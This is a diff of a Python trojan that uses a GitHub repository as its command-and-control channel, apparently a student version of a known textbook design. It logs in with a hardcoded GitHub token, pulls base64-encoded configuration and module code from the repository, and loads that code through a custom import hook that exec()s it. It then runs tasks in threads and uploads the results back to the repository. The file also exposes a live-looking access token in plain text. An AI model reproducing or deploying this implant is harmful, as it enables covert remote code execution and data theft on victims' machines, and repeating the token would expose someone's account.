@@ -1,77 +1,133 @@
-import base64
-from os import name
-import github3
-import importlib
 import json
-import random
+import base64
 import sys
+import time
+import importlib
+import random
 import threading
-import time 
+import queue
 from datetime import datetime
+from github3 import login
 
-def github_connect():
-  with open('git_token.txt') as f:
-    token = f.read()
-  user = 'Sharerwe'
-  session = github3.login(token=token)
-  return session.repository(user, 'Class_project')
+trojan_id = "abc"
+trojan_config = "config/{}.json".format(trojan_id)
+data_path = "data/{}/".format(trojan_id)
+trojan_modules = []
+configured = False
+task_queue = queue.Queue()
 
-def get_file_contents(dirname, module_name, repo):
-  return repo.file_contents(f'{dirname}/{module_name}').content
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ""
 
-class Client:
-  
-  def __init__(self,id):
-    self.id = id
-    self.config_file = f'{id}.json'
-    self.data_path = f'data/{id}/'
-    self.repo = github_connect()
-  
-  def get_config(self):
-    config_json = get_file_contents('config', self.config_file, self.repo)
-    config = json.loads(base64.b64decode(config_json))
+    def find_module(self, fullname, path=None):
+        if configured:
+            print(f" [**] Attempting to retrieve {fullname}")
+            
+            new_library = get_file_contents(f"modules/{fullname}")
+            
+            # print(new_library, 'in find_module')
+            
+            if new_library:
+                
+                self.current_module_code = base64.b64decode(new_library)
+                               
+                return self
+        
+        return None
+
+    def load_module(self, name):
+        gh, repo, branch = connect_to_github()
+        print('1 -> in load_module: ', name)
+        
+        spec = importlib.util.spec_from_loader(name, loader=None, origin=repo.git_url)
+        mod = importlib.util.module_from_spec(spec)
+        
+        print('2 -> in load_module: ', mod)
+
+        exec(self.current_module_code, mod.__dict__)
+        sys.modules[spec.name] = mod
+        
+        return mod
+
+def connect_to_github():
+    gh = login(username='JochiRaider',token=' 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') # 2FA accounts: replace password= with token="your token"
+    repo = gh.repository('JochiRaider', 'VPI_FS_project')
+    branch = repo.branch("main")
+    return gh, repo, branch
+
+def get_file_contents(filepath):
+    gh, repo, branch = connect_to_github()
+    tree = branch.commit.commit.tree.to_tree().recurse()
     
-    for task in config:
-      if task['module'] not in sys.modules:
-        exec(f"import {task['module']}")
-    return config
-  def module_runner(self, module):
-    result = sys.modules[module].run()
-    self.store_module_result(result)
-  def store_module_result(self, data):
+     
+    for filename in tree.tree:
+       
+        # print(filepath,filename.path)
+       
+        if filepath in filename.path:
+            print(f"[+] Found file {filepath}")
+            blob = repo.blob(filename._json_data["sha"])
+            return blob.content
+        
+
+def get_trojan_config():
+    global configured
+    config_json = get_file_contents(trojan_config)
+    
+    # print(config_json)
+
+    configuration = json.loads(base64.b64decode(config_json))
+    configured = True
+
+    # print('in get_trojan_config func: ', configuration)
+
+    for tasks in configuration:
+        
+        # print('in get_trojan_config loop', tasks)
+
+        if tasks["module"] not in sys.modules:
+            print(f"BB import {tasks['module']}")
+
+            exec(f"import {tasks['module']}")
+
+            print(f"AA import {tasks['module']}")
+
+    return configuration
+
+def store_module_result(data):
+    gh, repo, branch = connect_to_github()
+    
     message = datetime.now().isoformat()
-    remote_path = f'data/{self.id}/{message}.data'
+
+    remote_path = f"data/{trojan_id}/{message}.data"
+    
     bindata = bytes('%r' %data, 'utf-8')
-    self.repo.create_file(remote_path, message, base64.b64encode(bindata))
-  def run(self):
-    while True:
-       config = self.getconfig()
-       for task in config:
-         thread = threading.Thread(target=self.module_runner, args=(task['module'],))
-         thread.start()
-         time.sleep(random.randint(1, 10))
-       time.sleep(random.randint(30*60, 3*60*60))
+    repo.create_file(remote_path, message, base64.b64encode(bindata))
+    
+    
 
-class GitImporter:
-  def __init__(self):
-    self.current_module_code = ""
-  
-  def find_module(self,name, path = None):
-    print(f"[*] Attempting to retrueve {name}")
-    self.repo = github_connect()
-    new_library = get_file_contents('modules',f'{name}.py',self.repo)
-    if new_library is not None:
-      self.current_module_code = base64.b64decode(new_library)
-      return self
-  
-  def load_module(self, name):
-    spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
-    new_module = importlib.util.module_from_spec(spec)
-    exec(self.current_module_code, new_module.__dict__)
-    sys.modules[spec.name] = new_module
-    return new_module
+def module_runner(module):
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
 
-if name == '__main__':
-  sys.meta_path.append(GitImporter())
-  client = Client('abc')
-  client.run()
+    store_module_result(result)
+    
+
+# main loop
+sys.meta_path = [GitImporter()]
+
+while True:
+    if task_queue.empty():
+        print('in main: ')
+        
+        config = get_trojan_config()
+        
+        print('in main: ', config)
+        
+        for task in config:
+            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1,10))
+    # time.sleep(random.randint(10000, 60000))
